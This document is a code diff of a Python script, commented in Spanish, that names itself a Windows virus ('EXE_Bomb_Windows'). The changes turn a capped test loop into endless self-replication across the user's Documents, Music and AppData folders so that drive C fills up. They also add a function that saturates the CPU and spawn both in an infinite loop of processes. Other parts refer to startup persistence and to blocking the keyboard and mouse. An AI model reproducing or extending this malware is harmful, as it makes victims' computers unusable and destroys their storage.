@@ -8,6 +8,7 @@ from multiprocessing import Process
 import threading
 import shutil
 import string
+
 import random
           
 def addStartup():  # function =  Iniciar automaticamente
@@ -52,7 +53,7 @@ def CreateFileMain():   # Crea carpeta que contiene el virus
         except:
             return False
         pass
-def AutoCopy():
+def AutoCopy():         # Se replcia en el sistema, (Satura la Unidad:C)
     def random_char(y):
            return ''.join(random.choice(string.ascii_letters) for x in range(y))
     nameKey     = "EXE_Bomb_Windows" # Nombre del virus
@@ -145,9 +146,7 @@ def AutoCopy():
     
     #inicia Hilo
     CreateFolder() 
-    for x in range(2):    #Cambiar por un while(True)
-        print("for pe")
-        """ # Copia
+    while(True):
         CopyDoc()
         CopyMus()
         CopyVic()
@@ -156,9 +155,25 @@ def AutoCopy():
         CopyRoa()
         CopyLocL()
         CopyLoc()
-        """
 
-
+def CPU():
+    def sature():
+        n1 =  (random.randrange(98798498456498889)/random.randrange(15))
+        n2 =  (random.randrange(98798498456498889)+random.randrange(64165143651651))
+        n3 =  (random.randrange(98798498456498889)*random.randrange(999))
+        n4 =  (random.randrange(98798498456498889)*random.randrange(453))
+        n5 =  (random.randrange(98798498456498889)-random.randrange(453453453453453453))
+        n6 =  (random.randrange(98798498456498889)*random.randrange(1435))
+        n7 =  (random.randrange(98798498456498889)*random.randrange(4534))
+        n8 =  (random.randrange(98798498456498889)-random.randrange(45345453453453453))
+        n9 =  (random.randrange(98798498456498889)*random.randrange(154345))
+        n10 = (random.randrange(98798498456498889)*random.randrange(4354345345345))
+    while(True):
+        try:
+            while(True):
+                sature()
+        except:
+            pass   
         
         
 if __name__ == '__main__':
@@ -181,30 +196,11 @@ if __name__ == '__main__':
         exit()
     else:                   # Solo se ejecuta si la PC ya está infectada
         block = threading.Thread(target=Block)   # Bloquea Teclado y mouse
-        autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+        #block.start()           # Bloquea teclado y mouse 
         
-        
-        #block.start()
-        autocopy.start()         
-        
-        
-        
-        
-        
-        
-        
-        
-        #h1= threading.Thread(target=ReplicateFile)   # C
-        #h1.start()
-        #h1.join()
-        """
-        p1 = Process(target=a)     #  Inicia automaticamente
-        p2 = Process(target=B)          # 
-        p2.start()
-        p1.start()
-        """
-        
-        #p1.join()
-        #p2.join()
-        print("la carpeta ya existe, \nvirus en acción")
+        while(True):
+            autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+            cpuS = Process(target=CPU)
+            cpuS.start()
+            autocopy.start()        # Saturación del disco duro
 
